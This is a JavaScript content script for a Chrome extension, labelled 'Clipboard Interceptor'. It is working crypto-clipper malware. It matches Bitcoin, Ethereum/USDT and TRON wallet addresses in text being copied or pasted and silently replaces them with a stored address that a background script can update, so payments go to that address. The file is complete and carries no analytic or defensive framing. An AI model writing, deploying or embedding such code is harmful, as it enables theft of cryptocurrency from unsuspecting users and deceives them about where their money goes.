/**
 * Clipboard Interceptor — Replaces wallet addresses on copy or paste with a stored replacement address.
 */

const WALLET_KEY = "clipboardWalletAddress";
let replacementWallet = "";

// Patterns for Bitcoin, Ethereum, USDT (ERC20/TRC20), TRON
const WALLET_REGEXES = [
  /\b([13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{39,59})\b/g, // BTC
  /\b0x[a-fA-F0-9]{40}\b/g, // ETH, USDT (ERC20)
  /\bT[1-9A-HJ-NP-Za-km-z]{33}\b/g // TRON
];

// Load stored address
chrome.storage.local.get([WALLET_KEY], (res) => {
  replacementWallet = res[WALLET_KEY] || "";
});

// Update address if background script updates it
chrome.storage.onChanged.addListener((changes) => {
  if (changes[WALLET_KEY]) {
    replacementWallet = changes[WALLET_KEY].newValue || "";
  }
});

// Shared replacement logic
function replaceWalletAddresses(text) {
  if (!replacementWallet) return text;
  let replaced = text;
  for (const regex of WALLET_REGEXES) {
    replaced = replaced.replace(regex, replacementWallet);
  }
  return replaced;
}

// Handle paste event — replace content before insertion
function handlePasteEvent(e) {
  if (!e.clipboardData) return;
  const originalText = e.clipboardData.getData("text");
  const replacedText = replaceWalletAddresses(originalText);

  if (replacedText !== originalText) {
    e.preventDefault();
    try {
      e.clipboardData.setData("text/plain", replacedText);
    } catch (_) {}

    // Fallback for inserting into form fields
    const active = document.activeElement;
    if (
      active instanceof HTMLInputElement ||
      active instanceof HTMLTextAreaElement
    ) {
      try {
        document.execCommand("insertText", false, replacedText);
      } catch (_) {
        active.value += replacedText;
      }
    }
  }
}

// Handle copy event — replace copied content before it reaches clipboard
function handleCopyEvent(e) {
  const selection = window.getSelection()?.toString();
  if (!selection || !e.clipboardData) return;

  const replaced = replaceWalletAddresses(selection);

  if (replaced !== selection) {
    e.preventDefault();
    try {
      e.clipboardData.setData("text/plain", replaced);
    } catch (_) {}
  }
}

// Attach both events
document.addEventListener("paste", handlePasteEvent, true);
document.addEventListener("copy", handleCopyEvent, true);
